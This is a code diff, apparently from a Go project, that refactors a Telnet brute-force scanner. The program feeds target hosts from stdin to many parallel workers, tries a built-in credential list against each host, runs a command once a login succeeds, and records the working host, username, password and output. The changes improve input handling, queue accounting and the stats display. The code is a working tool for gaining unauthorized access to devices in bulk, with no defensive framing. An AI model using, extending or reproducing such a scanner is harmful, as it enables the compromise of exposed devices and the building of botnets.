@@ -180,12 +180,7 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 				return false, "write command failed"
 			}
 			output := s.readCommandOutput(conn)
-			return true, CredentialResult{
-				Host:     host,
-				Username: username,
-				Password: password,
-				Output:   output,
-			}
+			return true, CredentialResult{Host: host, Username: username, Password: password, Output: output}
 		}
 	}
 	return false, "no shell prompt"
@@ -222,10 +217,10 @@ func (s *TelnetScanner) worker() {
 	defer s.wg.Done()
 	for host := range s.hostQueue {
 		atomic.AddInt64(&s.queueSize, -1)
-		found := false
 		if host == "" {
 			continue
 		}
+		found := false
 		for _, cred := range CREDENTIALS {
 			success, result := s.tryLogin(host, cred.Username, cred.Password)
 			if success {
@@ -261,7 +256,7 @@ func (s *TelnetScanner) statsThread() {
 			queueSize := atomic.LoadInt64(&s.queueSize)
 			memStats := runtime.MemStats{}
 			runtime.ReadMemStats(&memStats)
-			fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | queue: %d | routines: %d\n",
+			fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | queue: %d | routines: %d",
 				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
 		}
 	}
@@ -271,20 +266,27 @@ func (s *TelnetScanner) Run() {
 	fmt.Printf("Initializing scanner (%d / %d)...\n\n\n", MAX_WORKERS, MAX_QUEUE_SIZE)
 	go s.statsThread()
 
-	// Loop membaca stdin terus-menerus
 	go func() {
-		scanner := bufio.NewScanner(os.Stdin)
-		for scanner.Scan() {
-			host := scanner.Text()
-			if host != "" {
-				atomic.AddInt64(&s.queueSize, 1)
+		for {
+			scanner := bufio.NewScanner(os.Stdin)
+			for scanner.Scan() {
+				host := scanner.Text()
+				if len(host) < 7 || len(host) > 50 {
+					continue
+				}
 				select {
 				case s.hostQueue <- host:
+					atomic.AddInt64(&s.queueSize, 1)
 				default:
-					time.Sleep(5 * time.Millisecond)
+					time.Sleep(1 * time.Millisecond)
 					s.hostQueue <- host
+					atomic.AddInt64(&s.queueSize, 1)
 				}
 			}
+			if err := scanner.Err(); err != nil {
+				fmt.Fprintf(os.Stderr, "[stdin error] %v\n", err)
+			}
+			time.Sleep(1 * time.Second)
 		}
 	}()
 
@@ -293,9 +295,7 @@ func (s *TelnetScanner) Run() {
 		go s.worker()
 	}
 
-	for {
-		time.Sleep(10 * time.Second)
-	}
+	select {} // loop abadi
 }
 
 func main() {
